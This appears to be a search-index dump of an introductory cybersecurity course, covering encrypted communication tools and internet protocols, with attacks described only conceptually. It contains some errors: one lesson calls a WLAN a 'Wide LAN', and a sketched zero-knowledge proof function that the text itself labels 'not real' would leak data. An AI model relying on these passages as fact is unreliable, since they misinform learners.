Encryption"},{"location":"LECTURES/unit11/lesson11-3/#encrypted-email","text":"","title":"Encrypted Email"},{"location":"LECTURES/unit11/lesson11-3/#pgpgpg","text":"Pretty Good Privacy - Email encryption standard Key management: # Generate key gpg --full-generate-key # List keys gpg --list-keys gpg --list-secret-keys # Export public key gpg --armor --export your@email.com > public_key.asc # Import someone's public key gpg --import their_public_key.asc # Sign someone's key (trust) gpg --sign-key their@email.com Encrypt email: # Encrypt message gpg --encrypt --armor --recipient recipient@email.com message.txt # Encrypt and sign gpg --encrypt --sign --armor --recipient recipient@email.com message.txt # Decrypt gpg --decrypt encrypted_message.txt.asc Using with email client: Thunderbird + Enigmail: - Install Enigmail addon - Generate or import key - Compose \u2192 Encrypt message - Automatic encryption when recipient's key available Web of Trust: You sign Alice's key (you trust Alice is Alice) Alice signs Bob's key (Alice trusts Bob is Bob) You can trust Bob's key through Alice (transitive trust)","title":"PGP/GPG"},{"location":"LECTURES/unit11/lesson11-3/#smime","text":"Secure/Multipurpose Internet Mail Extensions Differences from PGP: - Uses X.509 certificates - Requires Certificate Authority - Better enterprise support - Native support in email clients - Hierarchical trust model Get certificate: 1. Purchase from CA (or use free from organizations) 2. Generate CSR 3. Submit to CA 4. Receive certificate 5. Install in email client Outlook S/MIME: - File \u2192 Options \u2192 Trust Center \u2192 Email Security - Import certificate - \"Encrypt contents and attachments\" - \"Add digital signature\"","title":"S/MIME"},{"location":"LECTURES/unit11/lesson11-3/#secure-file-transfer","text":"","title":"Secure File Transfer"},{"location":"LECTURES/unit11/lesson11-3/#scp-secure-copy-protocol","text":"Copy files over SSH: # Upload file scp local_file.txt user@remote:/path/ # Download file scp user@remote:/path/file.txt local_directory/ # Copy directory scp -r local_directory/ user@remote:/path/ # Specify port scp -P 2222 file.txt user@remote:/path/ # Preserve file attributes scp -p file.txt user@remote:/path/","title":"SCP (Secure Copy Protocol)"},{"location":"LECTURES/unit11/lesson11-3/#sftp-ssh-file-transfer-protocol","text":"Interactive file transfer: # Connect sftp user@remote # Navigate pwd # Print working directory lpwd # Print local working directory ls # List remote files lls # List local files cd directory # Change remote directory lcd directory # Change local directory # Transfer put local_file.txt # Upload get remote_file.txt # Download put -r directory/ # Upload directory get -r directory/ # Download directory # Exit exit","title":"SFTP (SSH File Transfer Protocol)"},{"location":"LECTURES/unit11/lesson11-3/#rsync-over-ssh","text":"Efficient file synchronization: # Sync directory rsync -avz -e ssh local_dir/ user@remote:/path/ # Options explained: # -a: archive mode (preserve permissions, timestamps) # -v: verbose # -z: compress during transfer # -e ssh: use SSH # Sync with delete (mirror) rsync -avz --delete -e ssh local_dir/ user@remote:/path/ # Dry run (test without changes) rsync -avzn -e ssh local_dir/ user@remote:/path/ # Show progress rsync -avz --progress -e ssh local_dir/ user@remote:/path/ # Exclude files rsync -avz --exclude='*.log' -e ssh local_dir/ user@remote:/path/","title":"rsync over SSH"},{"location":"LECTURES/unit11/lesson11-3/#magic-wormhole","text":"Simple encrypted file transfer: # Install pip install magic-wormhole # Send file wormhole send file.txt # Outputs code: 7-crossword-ventilate # Receive (on other machine) wormhole receive 7-crossword-ventilate # Send directory wormhole send --code 5-example-code directory/ # The code is used for key exchange # End-to-end encrypted # Works through NAT/firewalls","title":"Magic Wormhole"},{"location":"LECTURES/unit11/lesson11-3/#encrypted-messaging-applications","text":"","title":"Encrypted Messaging Applications"},{"location":"LECTURES/unit11/lesson11-3/#signal","text":"Architecture: - Open source - Centralized servers (but can't read messages) - Phone number as identifier - Desktop and mobile apps - Voice and video calls Security features: - End-to-end encryption (Signal Protocol) - Perfect forward secrecy - Sealed sender (hide metadata) - Disappearing messages - Screen security (screenshot protection) - Registration lock - Safety numbers (verify identity)","title":"Signal"},{"location":"LECTURES/unit11/lesson11-3/#matrixelement","text":"Architecture: - Open source - Decentralized (federated servers) - Self-hostable - Username as identifier - Voice and video calls Security features: - End-to-end encryption (Olm/Megolm) - Device verification - Cross-signing - Encrypted attachments - Federated identity","title":"Matrix/Element"},{"location":"LECTURES/unit11/lesson11-3/#wire","text":"Architecture: - Open source - End-to-end encrypted - Supports teams/business - No phone number required Security features: - Signal Protocol - Encrypted audio/video - Encrypted file sharing - External audit","title":"Wire"},{"location":"LECTURES/unit11/lesson11-3/#privacy-enhancing-technologies","text":"","title":"Privacy-Enhancing Technologies"},{"location":"LECTURES/unit11/lesson11-3/#tor-the-onion-router","text":"Anonymous communication: # Install Tor sudo apt install tor # Configure as SOCKS proxy # In /etc/tor/torrc: SocksPort 9050 # Start Tor sudo systemctl start tor # Use with applications curl --socks5-hostname localhost:9050 https://check.torproject.org/ # Use Tor Browser (recommended) # Download from torproject.org How Tor works: You \u2192 Entry node \u2192 Middle node \u2192 Exit node \u2192 Destination Each hop only knows previous and next hop Destination doesn't know your IP You don't know full path Encrypted in layers (like onion)","title":"Tor (The Onion Router)"},{"location":"LECTURES/unit11/lesson11-3/#i2p-invisible-internet-project","text":"Anonymous network layer: # Install I2P sudo apt install i2p # Access web interface # http://127.0.0.1:7657 # I2P provides: # - Anonymous hosting # - Encrypted communication # - Distributed network # - Hidden services","title":"I2P (Invisible Internet Project)"},{"location":"LECTURES/unit11/lesson11-3/#mixnets","text":"Anonymize metadata through mixing: Examples: - Nym Network - Katzenpost - Loopix How it works: 1. Batch messages from multiple senders 2. Mix (reorder) messages 3. Add delays 4. Forward to next mix node 5. Repeat multiple hops 6. Deliver to recipients Result: Hard to trace which output came from which input","title":"Mixnets"},{"location":"LECTURES/unit11/lesson11-3/#zero-knowledge-proofs","text":"Prove you know something without revealing it Example: Proving age without revealing birthdate # Simplified concept (not real ZKP) def prove_over_18(birthdate, current_date): \"\"\"Prove age > 18 without revealing exact age\"\"\" age = current_date.year - birthdate.year # Create commitment commitment = hash(birthdate + random_salt) # Prove age > 18 without revealing birthdate proof = { 'commitment': commitment, 'is_over_18': age >= 18, 'verification_data': generate_zkp(age >= 18) } return proof # Verifier can confirm age > 18 # But learns nothing else about birthdate Real-world applications: - Anonymous credentials - Private voting - Blockchain privacy (Zcash) - Private authentication","title":"Zero-Knowledge Proofs"},{"location":"LECTURES/unit11/lesson11-3/#secure-communication-best-practices","text":"","title":"Secure Communication Best Practices"},{"location":"LECTURES/unit11/lesson11-3/#operational-security","text":"Communication security: - Use E2EE for sensitive conversations - Verify contacts (safety numbers) - Enable disappearing messages for sensitive topics - Be aware of metadata leakage - Use secure devices Key management: - Generate strong keys - Backup keys securely - Rotate keys regularly - Revoke compromised keys - Verify key fingerprints Platform selection: - Open source preferred - Audited by security researchers - Active maintenance - Clear threat model - Strong encryption defaults","title":"Operational Security"},{"location":"LECTURES/unit11/lesson11-3/#threat-modeling","text":"Ask yourself: What are you protecting? - Messages - Metadata (who talks to whom) - Files - Identity Who are you protecting against? - Casual snoopers - Criminals - Corporations - Governments - Nation states Choose tools accordingly: - Casual privacy: Signal, Wire - High anonymity: Tor, I2P - Maximum security: Air-gapped systems","title":"Threat Modeling"},{"location":"LECTURES/unit11/lesson11-3/#key-takeaways","text":"End-to-end encryption: - Only sender and recipient can read - Server compromise doesn't expose messages - Signal Protocol is gold standard - Requires proper key management Email security: - PGP/GPG for decentralized encryption - S/MIME for enterprise - Both require key/certificate management - Metadata still exposed File transfer: - SCP/SFTP for regular use - rsync for synchronization - Magic Wormhole for simplicity - Always verify recipients Privacy technologies: - Tor for anonymity - I2P for hidden services - Mixnets for metadata protection - Zero-knowledge proofs for selective disclosure Remember: - Encryption protects content, not metadata - Perfect forward secrecy is important - Verify keys/identities - Choose tools for your threat model - Security vs. convenience tradeoff Secure communication is more than just encryption\u2014it's about protecting privacy, ensuring authenticity, and defending against diverse threats. Understanding these technologies helps you choose the right tools and use them correctly.","title":"Key Takeaways"},{"location":"LECTURES/unit2/lesson2-1/","text":"LESSON 3: INTERNET PROTOCOLS How does the Internet work? The internet works by sending packets of information across the network. There are certain technologies that determine how this information is sent and with what. These are called protocols What's a protocol? A protocol is basically just a regulation or ruleset for how certain data is sent. The two we'll talk about are TCP and UDP. TCP, or Transmission Control Protocol, basically sends packets in a way where it's about QUALITY over speed. This means that packets are sent in full functionality, which means that data is reliable and uncorrupted. However, UDP, or User Datagram Protocol, is more about speed and efficiency. TCP is then used in other protocols, like FTP for file transfers, HTTP or HTTPS, which is for displaying web pages, SMTP for emails, etc. UDP is used for things like video game chats, video conferencing like Zoom calls, and VoIP, or Voice over Internet Protocol, which basically means voice chats. This speed but lack of accuracy is what can lead to freezing or stuttering or missing data. When data is sent using TCP, there's this thing called a TCP header, which contains important information that helps routers route where the packet should go, hopping to the right location, and eventually going back. Data reliability vs validity? Data is reliable when it's uncorrupted and functional. But data can be reliable and also invalid. Valid data means accurate data. For example, if I have a text file that contains people's heights and the file is uncorrupted, it's reliable. But if the heights I write down are in seconds, and not in feet or cm, then most likely the data is invalid. What about Networks? In terms of networks, when we connect different computers together, that is an INTERnet. An INTRAnet would be a local network, but an INTERnet would be (usually) across longer distances, and at a large scale. But technically the local network of your home could be called an internet, but that's not what we usually say. There's different network models out there, such as LAN or WLAN, PAN, and there's various security solutions to keep these things safe. A LAN is basically just a local area network of computers. A WLAN is just just a Wide LAN. So a corporate building or a college campus network would be a WLAN (technically there are more specific terminologies for these, but it's fine). A PAN is a Personal Area Network. When you connect peripherals (like a mouse or keyboard) wirelessly, or use your wireless earbuds to listen to music, that is an example of a PAN. A 1-person network with more than one device, interconnected. Security? VPNS, firewalls, and other intrusion prevension systems are used to protect these networks. This is the core of cybersecurity. Keeping our networks safe from attackers. But don't think that these solutions keep you completely anonymous or anything. There's a lot of information out there. We can go more in depth on these later in a future lesson about online anonymity and security. When are we getting to the cool stuff? If you're talking about commands in the terminal...Don't worry. In the next lesson, we're jumping straight into the basics of Kali Linux.","title":"Lesson 2.1"},{"location":"LECTURES/unit2/lesson2-1/#lesson-3-internet-protocols","text":"How does the Internet work? The internet works by sending packets of information across the network. There are certain technologies that determine how this information is sent and with what. These are called protocols What's a protocol? A protocol is basically just a regulation or ruleset for how certain data is sent. The two we'll talk about are TCP and UDP. TCP, or Transmission Control Protocol, basically sends packets in a way where it's about QUALITY over speed. This means that packets are sent in full functionality, which means that data is reliable and uncorrupted. However, UDP, or User Datagram Protocol, is more about speed and efficiency. TCP is then used in other protocols, like FTP for file transfers, HTTP or HTTPS, which is for displaying web pages, SMTP for emails, etc. UDP is used for things like video game chats, video conferencing like Zoom calls, and VoIP, or Voice over Internet Protocol, which basically means voice chats. This speed but lack of accuracy is what can lead to freezing or stuttering or missing data. When data is sent using TCP, there's this thing called a TCP header, which contains important information that helps routers route where the packet should go, hopping to the right location, and eventually going back. Data reliability vs validity? Data is reliable when it's uncorrupted and functional. But data can be reliable and also invalid. Valid data means accurate data. For example, if I have a text file that contains people's heights and the file is uncorrupted, it's reliable. But if the heights I write down are in seconds, and not in feet or cm, then most likely the data is invalid. What about Networks? In terms of networks, when we connect different computers together, that is an INTERnet. An INTRAnet would be a local network, but an INTERnet would be (usually) across longer distances, and at a large scale. But technically the local network of your home could be called an internet, but that's not what we usually say. There's different network models out there, such as LAN or WLAN, PAN, and there's various security solutions to keep these things safe. A LAN is basically just a local area network of computers. A WLAN is just just a Wide LAN. So a corporate building or a college campus network would be a WLAN (technically there are more specific terminologies for these, but it's fine). A PAN is a Personal Area Network. When you connect peripherals (like a mouse or keyboard) wirelessly, or use your wireless earbuds to listen to music, that is an example of a PAN. A 1-person network with more than one device, interconnected. Security? VPNS, firewalls, and other intrusion prevension systems are used to protect these networks. This is the core of cybersecurity. Keeping our networks safe from attackers. But don't think that these solutions keep you completely anonymous or anything. There's a lot of information out there. We can go more in depth on these later in a future lesson about online anonymity and security. When are we getting to the cool stuff? If you're talking about commands in the terminal...Don't worry. In the next lesson, we're jumping straight into the basics of Kali Linux.","title":"LESSON 3: INTERNET PROTOCOLS"},{"location":"LECTURES/unit2/lesson2-2/","text":"Internet Protocols Deep Dive You know what the internet is and how it works at a high level. Now let's dive deeper into the protocols that make communication possible. Understanding these protocols is essential for security\u2014many attacks exploit protocol weaknesses or misconfigurations. The Protocol Stack Think of network communication as layers, each handling specific tasks. We'll examine the key protocols at each layer. Application Layer Protocols These are the protocols you interact with directly. HTTP (HyperText Transfer Protocol) HTTP is how web browsers communicate with web servers. HTTP Request Structure GET /index.html HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 Accept: text/html Accept-Language: en-US Connection: keep-alive Components: - Method : GET, POST, PUT, DELETE, etc. - Path : Resource being requested - Version : HTTP/1.1, HTTP/2, HTTP/3 - Headers : Metadata about the request HTTP Methods GET : Retrieve data GET /users/123 HTTP/1.1 POST : Submit data POST /users HTTP/1.1 Content-Type: application/json {\"name\": \"John\", \"email\": \"john@example.com\"} PUT : Update/replace resource PUT /users/123 HTTP/1.1 Content-Type: application/json {\"name\": \"John Updated\"} DELETE : Remove resource DELETE /users/123 HTTP/1.1 HEAD : Like GET but only returns headers OPTIONS : Describe communication options PATCH : Partial update HTTP Response Structure HTTP/1.1 200 OK Content-Type: text/html Content-Length: 1234 Server: Apache/2.4.41 Set-Cookie: sessionid=abc123 <!DOCTYPE html> <html> ... Status codes: - 1xx : Informational - 2xx : Success - 200: OK - 201: Created - 204: No Content - 3xx : Redirection - 301: Moved Permanently - 302: Found (temporary redirect) - 304: Not Modified - 4xx : Client errors - 400: Bad Request - 401: Unauthorized - 403: Forbidden - 404: Not Found - 5xx : Server errors - 500: Internal Server Error - 502: Bad Gateway - 503: Service Unavailable HTTP Security Issues Unencrypted : All data visible to anyone monitoring network Session hijacking : Steal cookies to impersonate users Man-in-the-middle : Intercept and modify traffic Replay attacks : Capture and replay requests This is why HTTPS exists. HTTPS (HTTP Secure) HTTPS = HTTP + TLS encryption What it protects: - Confidentiality: Data encrypted - Integrity: Detect if data modified - Authentication: Verify you're talking to the right server What it doesn't protect: - Endpoint security: If server is compromised, HTTPS can't help - Metadata: Can still see which sites you visit (not content) - User actions: If user clicks malicious link, HTTPS doesn't stop it Key concepts: - Requires valid SSL/TLS certificate - Browser verifies certificate before trusting connection - All traffic encrypted after handshake - Uses port 443 (HTTP uses port 80) DNS (Domain Name System) DNS translates domain names to IP addresses. DNS Record Types A record : IPv4 address example.com. IN A 93.184.216.34 AAAA record : IPv6 address example.com. IN AAAA 2606:2800:220:1:248:1893:25c8:1946 CNAME record : Alias to another domain www.example.com. IN CNAME example.com. MX record : Mail servers example.com. IN MX 10 mail.example.com. NS record : Name servers example.com. IN NS ns1.example.com. TXT record : Arbitrary text (used for SPF, DKIM, verification) example.com. IN TXT \"v=spf1 mx ~all\" PTR record : Reverse DNS (IP to domain) DNS Query Process User types www.example.com in browser Computer checks local DNS cache If not cached, queries configured DNS server (usually ISP's) DNS server checks its cache If not cached, queries root DNS servers Root server responds with TLD (Top-Level Domain) server for .com TLD server responds with authoritative name server for example.com Authoritative server responds with IP address Response cached at each level Browser connects to IP address DNS Security Issues DNS Spoofing/Poisoning : Provide false DNS responses - Attacker redirects traffic to malicious server - User thinks they're on legitimate site DNS Cache Poisoning : Corrupt DNS cache with false entries DNS Tunneling : Exfiltrate data through DNS queries - Encode data in subdomain names - Bypasses many security controls DDoS via DNS Amplification : Small queries \u2192 large responses - Attacker spoofs victim's IP - Sends queries to many DNS servers - Servers send large responses to victim DNSSEC : Digital signatures to verify DNS responses - Prevents spoofing - Not widely adopted yet FTP (File Transfer Protocol) FTP transfers files between client and server. How FTP Works Two channels: 1. Control channel (port 21): Commands and responses 2. Data channel (port 20 or random): Actual file transfer Active vs. Passive mode: - Active : Server initiates data connection to client (firewall issues) - Passive : Client initiates both connections (firewall-friendly) FTP Commands USER username # Provide username PASS password # Provide password LIST # List files RETR filename # Download file STOR filename # Upload file DELE filename # Delete file MKD directory # Create directory CWD directory # Change directory QUIT # Disconnect FTP Security Issues Major problem: Everything in plaintext - Username and password visible - File contents visible - Commands visible Solutions: - FTPS : FTP over TLS (explicit or implicit) - SFTP : SSH File Transfer Protocol (different protocol, runs over SSH) Example SFTP: sftp user@server sftp> ls sftp> get file.txt sftp> put local.txt sftp> quit SMTP (Simple Mail Transfer Protocol) SMTP sends email between servers. Email Sending Process User composes email in client (Gmail, Outlook) Client sends to SMTP server (port 25, 587, or 465) SMTP server looks up recipient's mail server (MX record) Sends email to recipient's SMTP server Recipient's server stores email Recipient downloads via POP3/IMAP SMTP Commands HELO/EHLO # Identify sender MAIL FROM: # Sender address RCPT TO: # Recipient address DATA # Start message content . # End message QUIT # Disconnect Email Security Issues SPF (Sender Policy Framework) : TXT record lists authorized sending servers v=spf1 mx ip4:192.0.2.0/24 ~all DKIM (DomainKeys Identified Mail) : Digital signature - Signs outgoing emails - Recipients verify signature DMARC (Domain-based Message Authentication) : Policy for SPF/DKIM failures v=DMARC1; p=reject; rua=mailto:dmarc@example.com Phishing : Spoofed sender addresses Spam : Unsolicited email Email harvesting : Collecting addresses for spam Malware attachments : Malicious files Transport Layer Protocols TCP (Transmission Control Protocol) TCP provides reliable, ordered delivery. Three-Way Handshake Connection establishment: 1. Client \u2192 Server: SYN (sequence = 1000) 2. Server \u2192 Client: SYN-ACK (sequence = 5000, ack = 1001) 3. Client \u2192 Server: ACK (sequence = 1001, ack = 5001) Connection established! TCP Header Key fields: - Source port (16 bits) - Destination port (16 bits) - Sequence number (32 bits): Track bytes sent - Acknowledgment number (32 bits): Track bytes received - Flags : SYN, ACK, FIN, RST, PSH, URG - Window size : Flow control - Checksum : Error detection TCP Flags SYN : Synchronize, start connection ACK : Acknowledge received data FIN : Finish, close connection gracefully RST : Reset, abrupt close (error) PSH : Push, send data immediately URG : Urgent, prioritize this data Connection Termination Four-way handshake: 1. Client \u2192 Server: FIN 2. Server \u2192 Client: ACK 3. Server \u2192 Client: FIN 4. Client \u2192 Server: ACK Connection closed! TCP Security SYN Flood attack : Send many SYN packets, never complete handshake - Exhausts server's connection table - Prevention: SYN cookies, rate limiting TCP hijacking : Inject packets with correct sequence numbers - Man-in-the-middle attack - Prevention: Encryption (TLS) Reset attacks : Send RST packets to terminate connections - Prevention: Encryption UDP (User Datagram Protocol) UDP is connectionless and unreliable (by design). UDP Header Simpler than TCP: - Source port (16 bits) - Destination port (16 bits) - Length (16 bits) - Checksum (16 bits) No sequence numbers, acknowledgments, or retransmissions. When to Use UDP Use cases: - DNS queries (single packet request/response) - Video streaming (dropped frames tolerable) - Online gaming (low latency critical) - VoIP (voice calls, some packet loss acceptable) - DHCP (network configuration) - SNMP (network monitoring) Advantages: - Lower overhead - Faster (no handshake) - Better for real-time applications Disadvantages: - No reliability guarantee - No flow control - No congestion control UDP Security UDP Flood : Send massive amounts of UDP packets - DDoS attack - Prevention: Rate limiting, firewall rules Amplification attacks : Small UDP query \u2192 large response - DNS amplification (50x) - NTP amplification (200x) - Prevention: Configure servers to not respond to spoofed sources Network Layer Protocols IP (Internet Protocol) IP handles addressing and routing. IPv4 Packet Structure Header fields: - Version : 4 for IPv4 - Header length : Usually 20 bytes - TTL (Time To Live): Decrements at each hop, prevents loops - Protocol : TCP (6), UDP (17), ICMP (1) - Source IP : 32-bit address - Destination IP : 32-bit address - Checksum : Header integrity IPv4 Address Classes (Historical) Class A : 0.0.0.0 to 127.255.255.255 (large networks) Class B : 128.0.0.0 to 191.255.255.255 (medium networks) Class C : 192.0.0.0 to 223.255.255.255 (small networks) Private ranges: - 10.0.0.0/8 (Class A) - 172.16.0.0/12 (Class B) - 192.168.0.0/16 (Class C) Special addresses: - 127.0.0.1: Loopback (localhost) - 0.0.0.0: Default route - 255.255.255.255: Broadcast IPv6 Address format : Eight groups of four hexadecimal digits 2001:0db8:85a3:0000:0000:8a2e:0370:7334 Abbreviation rules: - Leading zeros can be omitted: 2001:db8:85a3:0:0:8a2e:370:7334 - Consecutive zeros can be replaced with :: (once only): 2001:db8:85a3::8a2e:370:7334 Special addresses: - ::1 - Loopback - :: - Unspecified - fe80::/10 - Link-local - ff00::/8 - Multicast Why IPv6? - IPv4 exhaustion (4.3 billion addresses not enough) - IPv6 provides 340 undecillion addresses - Better security (IPsec built-in) - Simplified header - No NAT needed ICMP (Internet Control Message Protocol) ICMP sends error messages and diagnostic information. Common ICMP Types Echo Request (Type 8) : Ping request Echo Reply (Type 0) : Ping response Destination Unreachable (Type 3) : Can't reach destination Time Exceeded (Type 11) : TTL expired (used by traceroute) Redirect (Type 5) : Better route available Ping ping example.com # Sends Echo Request # Receives Echo Reply # Shows round-trip time (RTT) Security implications: - Network reconnaissance - ICMP tunneling (covert channel) - ICMP flooding (DoS) - Some networks block ICMP Traceroute traceroute example.com # Sends packets with increasing TTL # Each router decrements TTL # When TTL=0, router sends ICMP Time Exceeded # Shows path to destination ARP (Address Resolution Protocol) ARP maps IP addresses to MAC addresses on local network. How ARP Works Computer wants to send packet to 192.168.1.100 Checks ARP cache (known IP\u2192MAC mappings) If not cached, broadcasts ARP request: \"Who has 192.168.1.100? Tell 192.168.1.50\" Device with 192.168.1.100 responds: \"192.168.1.100 is at MAC aa:bb:cc:dd:ee:ff\" Requester caches this mapping Uses MAC address for actual communication ARP Commands # Show ARP cache arp -a ip neigh show # Delete ARP entry sudo arp -d 192.168.1.100 # Add static ARP entry sudo arp -s 192.168.1.100 aa:bb:cc:dd:ee:ff ARP Spoofing/Poisoning Attack: 1. Attacker sends fake ARP responses 2. Claims attacker's MAC is gateway's IP 3. Victim sends traffic to attacker instead of gateway 4. Attacker forwards traffic (man-in-the-middle) Detection: - Duplicate IP addresses - Unexpected ARP replies - Changing MAC addresses for same IP Prevention: - Static ARP entries (impractical) - ARP inspection on switches - Network monitoring Putting It All Together Example: Loading a Web Page Let's trace what happens when you visit https://example.com : DNS Resolution Query DNS server: \"What's the IP for example.com?\" Response: \"93.184.216.34\" ARP (if needed) \"What's the MAC address of my gateway?\" Gateway responds with its MAC TCP Handshake SYN to 93.184.216.34:443 SYN-ACK from server ACK from client TLS Handshake Client Hello (supported ciphers) Server Hello (chosen cipher, certificate) Key exchange Encrypted connection established HTTP Request GET / HTTP/1.1 Host: example.com HTTP Response 200 OK Content-Type: text/html HTML content Additional Resources Browser parses HTML Requests CSS, JavaScript, images Each resource: separate TCP connection (HTTP/1.1) or multiplexed (HTTP/2) Connection Close FIN/ACK exchange Or keep-alive for reuse Security at Each Layer Application Layer: - Input validation - Authentication - Encryption (HTTPS) Transport Layer: - Port filtering - SYN cookies - Rate limiting Network Layer: - IP filtering - Route filtering - Spoofing prevention Link Layer: - MAC filtering - ARP inspection - VLAN segmentation Defense in depth: Protect at multiple layers. Protocol Analysis Practice To understand protocols deeply: 1. Capture traffic with Wireshark 2. Examine packet structure 3. Follow protocol flows 4. Identify anomalies Suggested exercises: - Capture and analyze HTTP traffic - Observe TCP three-way handshake - Watch DNS resolution - Monitor ARP requests - Trace full web page load Understanding protocols is fundamental to: - Detecting attacks - Analyzing malware communication - Troubleshooting network issues - Designing secure systems In the next lessons, we'll apply this knowledge to identify and exploit protocol weaknesses, and then learn how to defend against those attacks.","title":"Lesson 2.2"},{"location":"LECTURES/unit2/lesson2-2/#internet-protocols-deep-dive","text":"You know what the internet is and how it works at a high level. Now let's dive deeper into the protocols that make communication possible. Understanding these protocols is essential for security\u2014many attacks exploit protocol weaknesses or misconfigurations.","title":"Internet Protocols Deep Dive"},{"location":"LECTURES/unit2/lesson2-2/#the-protocol-stack","text":"Think of network communication as layers, each handling specific tasks. We'll examine the key protocols at each layer.","title":"The Protocol Stack"},{"location":"LECTURES/unit2/lesson2-2/#application-layer-protocols","text":"These are the protocols you interact with directly.","title":"Application Layer Protocols"},{"location":"LECTURES/unit2/lesson2-2/#http-hypertext-transfer-protocol","text":"HTTP is how web browsers communicate with web servers.","title":"HTTP (HyperText Transfer Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#http-request-structure","text":"GET /index.html HTTP/1.1 Host: www.example.com User-Agent: Mozilla/5.0 Accept: text/html Accept-Language: en-US Connection: keep-alive Components: - Method : GET, POST, PUT, DELETE, etc. - Path : Resource being requested - Version : HTTP/1.1, HTTP/2, HTTP/3 - Headers : Metadata about the request","title":"HTTP Request Structure"},{"location":"LECTURES/unit2/lesson2-2/#http-methods","text":"GET : Retrieve data GET /users/123 HTTP/1.1 POST : Submit data POST /users HTTP/1.1 Content-Type: application/json {\"name\": \"John\", \"email\": \"john@example.com\"} PUT : Update/replace resource PUT /users/123 HTTP/1.1 Content-Type: application/json {\"name\": \"John Updated\"} DELETE : Remove resource DELETE /users/123 HTTP/1.1 HEAD : Like GET but only returns headers OPTIONS : Describe communication options PATCH : Partial update","title":"HTTP Methods"},{"location":"LECTURES/unit2/lesson2-2/#http-response-structure","text":"HTTP/1.1 200 OK Content-Type: text/html Content-Length: 1234 Server: Apache/2.4.41 Set-Cookie: sessionid=abc123 <!DOCTYPE html> <html> ... Status codes: - 1xx : Informational - 2xx : Success - 200: OK - 201: Created - 204: No Content - 3xx : Redirection - 301: Moved Permanently - 302: Found (temporary redirect) - 304: Not Modified - 4xx : Client errors - 400: Bad Request - 401: Unauthorized - 403: Forbidden - 404: Not Found - 5xx : Server errors - 500: Internal Server Error - 502: Bad Gateway - 503: Service Unavailable","title":"HTTP Response Structure"},{"location":"LECTURES/unit2/lesson2-2/#http-security-issues","text":"Unencrypted : All data visible to anyone monitoring network Session hijacking : Steal cookies to impersonate users Man-in-the-middle : Intercept and modify traffic Replay attacks : Capture and replay requests This is why HTTPS exists.","title":"HTTP Security Issues"},{"location":"LECTURES/unit2/lesson2-2/#https-http-secure","text":"HTTPS = HTTP + TLS encryption What it protects: - Confidentiality: Data encrypted - Integrity: Detect if data modified - Authentication: Verify you're talking to the right server What it doesn't protect: - Endpoint security: If server is compromised, HTTPS can't help - Metadata: Can still see which sites you visit (not content) - User actions: If user clicks malicious link, HTTPS doesn't stop it Key concepts: - Requires valid SSL/TLS certificate - Browser verifies certificate before trusting connection - All traffic encrypted after handshake - Uses port 443 (HTTP uses port 80)","title":"HTTPS (HTTP Secure)"},{"location":"LECTURES/unit2/lesson2-2/#dns-domain-name-system","text":"DNS translates domain names to IP addresses.","title":"DNS (Domain Name System)"},{"location":"LECTURES/unit2/lesson2-2/#dns-record-types","text":"A record : IPv4 address example.com. IN A 93.184.216.34 AAAA record : IPv6 address example.com. IN AAAA 2606:2800:220:1:248:1893:25c8:1946 CNAME record : Alias to another domain www.example.com. IN CNAME example.com. MX record : Mail servers example.com. IN MX 10 mail.example.com. NS record : Name servers example.com. IN NS ns1.example.com. TXT record : Arbitrary text (used for SPF, DKIM, verification) example.com. IN TXT \"v=spf1 mx ~all\" PTR record : Reverse DNS (IP to domain)","title":"DNS Record Types"},{"location":"LECTURES/unit2/lesson2-2/#dns-query-process","text":"User types www.example.com in browser Computer checks local DNS cache If not cached, queries configured DNS server (usually ISP's) DNS server checks its cache If not cached, queries root DNS servers Root server responds with TLD (Top-Level Domain) server for .com TLD server responds with authoritative name server for example.com Authoritative server responds with IP address Response cached at each level Browser connects to IP address","title":"DNS Query Process"},{"location":"LECTURES/unit2/lesson2-2/#dns-security-issues","text":"DNS Spoofing/Poisoning : Provide false DNS responses - Attacker redirects traffic to malicious server - User thinks they're on legitimate site DNS Cache Poisoning : Corrupt DNS cache with false entries DNS Tunneling : Exfiltrate data through DNS queries - Encode data in subdomain names - Bypasses many security controls DDoS via DNS Amplification : Small queries \u2192 large responses - Attacker spoofs victim's IP - Sends queries to many DNS servers - Servers send large responses to victim DNSSEC : Digital signatures to verify DNS responses - Prevents spoofing - Not widely adopted yet","title":"DNS Security Issues"},{"location":"LECTURES/unit2/lesson2-2/#ftp-file-transfer-protocol","text":"FTP transfers files between client and server.","title":"FTP (File Transfer Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#how-ftp-works","text":"Two channels: 1. Control channel (port 21): Commands and responses 2. Data channel (port 20 or random): Actual file transfer Active vs. Passive mode: - Active : Server initiates data connection to client (firewall issues) - Passive : Client initiates both connections (firewall-friendly)","title":"How FTP Works"},{"location":"LECTURES/unit2/lesson2-2/#ftp-commands","text":"USER username # Provide username PASS password # Provide password LIST # List files RETR filename # Download file STOR filename # Upload file DELE filename # Delete file MKD directory # Create directory CWD directory # Change directory QUIT # Disconnect","title":"FTP Commands"},{"location":"LECTURES/unit2/lesson2-2/#ftp-security-issues","text":"Major problem: Everything in plaintext - Username and password visible - File contents visible - Commands visible Solutions: - FTPS : FTP over TLS (explicit or implicit) - SFTP : SSH File Transfer Protocol (different protocol, runs over SSH) Example SFTP: sftp user@server sftp> ls sftp> get file.txt sftp> put local.txt sftp> quit","title":"FTP Security Issues"},{"location":"LECTURES/unit2/lesson2-2/#smtp-simple-mail-transfer-protocol","text":"SMTP sends email between servers.","title":"SMTP (Simple Mail Transfer Protocol)"},{"location":"LECTURES/unit2/lesson2-2/#email-sending-process","text":"User composes email in client (Gmail, Outlook) Client sends to SMTP server (port 25, 587, or 465) SMTP server looks up recipient's mail server (MX record) Sends email to recipient's SMTP server Recipient's server stores email Recipient downloads via POP3/IMAP","title":"Email Sending Process"},{"location":"LECTURES/unit2/lesson2-2/#smtp-commands","text":"HELO/EHLO # Identify sender MAIL FROM: # Sender address RCPT TO: # Recipient address DATA # Start message content . # End message QUIT # Disconnect","title":"SMTP Commands"},{"location":"LECTURES/unit2/lesson2-2/#email-security-issues","text":"SPF (Sender Policy Framework) : TXT record lists authorized sending servers v=spf1 mx ip4:192.0.2.0/24 ~all DKIM (DomainKeys Identified Mail) : Digital signature - Signs outgoing emails - Recipients verify signature DMARC (Domain-based Message Authentication) : Policy for SPF/DKIM failures v=DMARC1; p=reject; rua=mailto:dmarc@example.com Phishing : Spoofed sender addresses Spam : Unsolicited email Email harvesting : Collecting addresses for spam Malware attachments : Malicious files","title":"Email Security 